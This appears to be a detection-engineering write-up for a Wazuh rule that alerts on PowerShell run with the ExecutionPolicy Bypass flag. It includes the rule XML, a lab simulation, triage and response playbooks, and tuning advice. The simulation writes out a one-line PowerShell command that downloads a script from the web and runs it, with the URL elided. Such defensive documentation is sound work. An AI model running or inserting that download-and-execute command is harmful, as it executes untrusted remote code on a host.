# Detection 040 — Suspicious PowerShell Execution

## Objective

Detect instances of PowerShell being launched with the `-ExecutionPolicy Bypass` flag, which is commonly used by adversaries to override administrative script execution restrictions and execute unsigned or unauthorized scripts.

PowerShell execution policies are designed to prevent users from accidentally running untrusted scripts. However, the execution policy is a user-side configuration rather than a strict security boundary. Threat actors and offensive tools (such as Cobalt Strike, Empire, or custom stagers) routinely append `-ExecutionPolicy Bypass` (or shorthand variants like `-ep bypass`) to command lines to ensure malicious scripts execute unimpeded on target systems. DET-040 targets this specific command-line parameter when captured via Sysmon Process Creation events.

## MITRE ATT&CK

**Related Techniques:**
- **T1059.001** — Command and Scripting Interpreter: PowerShell

Adversaries leverage PowerShell to execute commands, download remote payloads, run scripts in memory, and interact with operating system APIs while attempting to bypass built-in execution policy controls.

## Windows / Sysmon Events

**Base Rule:** `92027` — Sysmon Event ID 1 (Process Creation for PowerShell processes).

Relevant fields include:

- Command Line (`win.eventdata.commandLine`): Full command-line execution string containing `-ExecutionPolicy Bypass`
- User (`win.eventdata.user`): Account context under which PowerShell was executed
- Image (`win.eventdata.image`): Path of the PowerShell binary (e.g., `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` or `pwsh.exe`)
- Parent Process (`win.eventdata.parentImage`): Parent application that spawned PowerShell (e.g., `cmd.exe`, `wscript.exe`, `explorer.exe`, or service binaries)

## Detection Logic

```text
Sysmon Event ID 1 (Process Creation - Rule 92027)
        ↓
Command Line contains regex: (?i)-ExecutionPolicy\s+Bypass
        ↓
Custom rule 100139 matches
        ↓
DET-040 alert generated (Level 10 - Medium/High Severity)
```

The rule triggers when Sysmon Event ID 1 (Process Creation for PowerShell binaries, parent SID `92027`) contains command-line flags matching case-insensitively (`(?i)`) to `-ExecutionPolicy Bypass`.

## Wazuh Rule

```xml
<rule id="100139" level="10">

    <!-- Existing Sysmon PowerShell detection -->
    <if_sid>92027</if_sid>

    <!-- Suspicious execution policy bypass -->
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-ExecutionPolicy\s+Bypass</field>

    <description>
        DET-040 - Suspicious PowerShell execution using ExecutionPolicy Bypass by $(win.eventdata.user)
    </description>

    <mitre>
        <id>T1059.001</id>
    </mitre>

    <group>
        custom_detection_engineering,
        windows,
        execution,
        powershell,
        suspicious_execution,
        attack.t1059.001
    </group>

</rule>
```

### Rule Details

| Field | Value |
|---|---|
| Detection ID | DET-040 |
| Wazuh Rule ID | 100139 |
| Severity | 10 (Medium / High Severity) |
| Parent Rule ID | 92027 (Sysmon Process Creation - PowerShell) |
| Detection Type | Sysmon Process Creation Audit |
| Event Source | `Microsoft-Windows-Sysmon/Operational` (Event ID 1) |
| MITRE Techniques | T1059.001 |
| Category | Execution / Command and Scripting Interpreter |

---

## Simulation

A PowerShell execution policy bypass simulation was conducted in the lab environment using standard command-line tools.

```text
Attacker / User Execution
        ↓
Launches PowerShell process with ExecutionPolicy Bypass flag:
  > powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\script.ps1
    OR
  > powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"
        ↓
Sysmon logs Event ID 1 detailing command-line parameters
        ↓
Wazuh parent rule 92027 matches
        ↓
Custom rule 100139 matches
        ↓
DET-040 alert generated (Level 10)
```

## Expected Alert

The expected Wazuh alert contains:

- **Detection:** `DET-040`
- **Rule ID:** `100139`
- **Severity:** `10`
- Description: `DET-040 - Suspicious PowerShell execution using ExecutionPolicy Bypass by <USER>`
- User (`win.eventdata.user`)
- Command Line (`win.eventdata.commandLine`)
- Parent Image (`win.eventdata.parentImage`)
- Timestamp

Example Alert Description Output:

```text
DET-040 - Suspicious PowerShell execution using ExecutionPolicy Bypass by LAB-DC01\admin_sec
```

## Validation Result

**Status: VALIDATED**

Custom rule 100139 successfully generated Level 10 alerts whenever `powershell.exe` was invoked with `-ExecutionPolicy Bypass` across various case combinations (`-ExecutionPolicy bypass`, `-executionpolicy Bypass`).

## Investigation Playbook

When DET-040 triggers, SOC analysts must analyze the command line and parent process to distinguish between routine administrative automation and malicious script execution.

### 1. Inspect Full Command Line

- **Script or Inline Command:** Is PowerShell executing a local `.ps1` file or executing an encoded/inline script via `-Command` / `-EncodedCommand`?
- **Network Activity Indicators:** Check if the command includes web download requests (`Invoke-WebRequest`, `DownloadString`, `Net.WebClient`).
- **Additional Flags:** Look for combined evasion flags such as `-NoProfile` (`-nop`), `-WindowStyle Hidden` (`-w hidden`), or `-NonInteractive` (`-noni`).

### 2. Examine Parent Process Lineage

- **Legitimate Parents:** Management frameworks (e.g., SCCM, Intune, Ansible, IT administrative scripts).
- **Suspicious Parents:** Office applications (`excel.exe`, `winword.exe`), web servers (`w3wp.exe`), scripting engines (`cscript.exe`, `wscript.exe`), or unstandardized command shells.

### 3. Cross-Reference Script Content & Execution Logs

- Check PowerShell Script Block Logging (Event ID 4104) to review the exact code executed inside the session.

### 4. Determine Classification

Classify the event:

- **False Positive / Benign:** Authorized administrative scripts, deployment agents, or IT maintenance tools configured with execution bypass switches.
- **True Positive:** Malicious execution initiated by web shells, phishing macro payloads, or post-exploitation frameworks.

## Response Playbook

### If activity is confirmed malicious

- **Terminate Process:** Terminate the suspicious PowerShell process tree immediately:
  ```powershell
  Stop-Process -Id <PID> -Force
  ```
- **Isolate Endpoint:** Network isolate the compromised machine to contain potential lateral movement.
- **Analyze Script Payload:** Extract and analyze the script payload or downloaded file from host artifacts or memory.
- **Revoke Compromised Credentials:** Reset credentials for the user account identified in `win.eventdata.user`.
- **Enforce Constrained Language Mode:** Consider implementing PowerShell Constrained Language Mode or AppLocker / Software Restriction Policies to restrict arbitrary script execution globally.

## False Positives

Common benign sources include:

- IT administrative automation tools and deployment agents (e.g., Chocolatey, SCCM scripts, custom maintenance tasks).
- Third-party software installers that run embedded PowerShell setup scripts using bypass arguments.

## Tuning Considerations

DET-040 operates at **Level 10**.

Tuning options:

- **Parent Process Whitelisting:** If enterprise management software (e.g., SCCM `C:\Windows\CCM\CcmExec.exe`) routinely uses execution policy bypass, create a child rule or suppression rule filtering out trusted parent image paths.
- **Shorthand Matching (Optional Enhancement):** Threat actors often use shorthand variants such as `-ep bypass`, `-exec bypass`, or `-e bypass`. To capture shorthand variations, update the PCRE2 regex:
  ```xml
  <field name="win.eventdata.commandLine" type="pcre2">(?i)-(?:ExecutionPolicy|ep|exec)\s+Bypass</field>
  ```

Proactive monitoring of PowerShell execution parameters ensures visibility into script-based attacks and defense evasion tactics.
